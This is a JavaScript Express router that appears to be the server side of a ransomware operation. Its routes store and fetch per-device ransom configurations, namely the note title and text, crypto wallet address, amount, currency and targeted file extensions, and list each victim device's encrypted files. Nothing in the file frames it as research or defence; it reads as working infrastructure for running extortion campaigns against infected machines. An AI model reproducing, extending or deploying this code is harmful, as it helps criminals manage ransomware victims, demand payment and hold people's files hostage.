const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/device/:deviceId', authMiddleware, async (req, res) => {
  const result = await db.query(
    'SELECT * FROM ransomware_configs WHERE device_id = (SELECT id FROM devices WHERE device_id = $1)',
    [req.params.deviceId]
  );
  res.json(result.rows[0] || null);
});

router.post('/device/:deviceId', authMiddleware, async (req, res) => {
  const { title, body, walletAddress, amount, currency, fileExtensions } = req.body;
  const result = await db.query(
    `INSERT INTO ransomware_configs (device_id, title, body, wallet_address, amount, currency, file_extensions, is_active)
     VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, true)
     ON CONFLICT (device_id) DO UPDATE SET
       title = EXCLUDED.title, body = EXCLUDED.body, wallet_address = EXCLUDED.wallet_address,
       amount = EXCLUDED.amount, currency = EXCLUDED.currency, file_extensions = EXCLUDED.file_extensions,
       is_active = true, created_at = NOW()
     RETURNING *`,
    [req.params.deviceId, title, body, walletAddress, amount, currency, fileExtensions]
  );
  res.json(result.rows[0]);
});

router.get('/encrypted/:deviceId', authMiddleware, async (req, res) => {
  const result = await db.query(
    'SELECT * FROM encrypted_files WHERE device_id = (SELECT id FROM devices WHERE device_id = $1)',
    [req.params.deviceId]
  );
  res.json(result.rows);
});

module.exports = router;
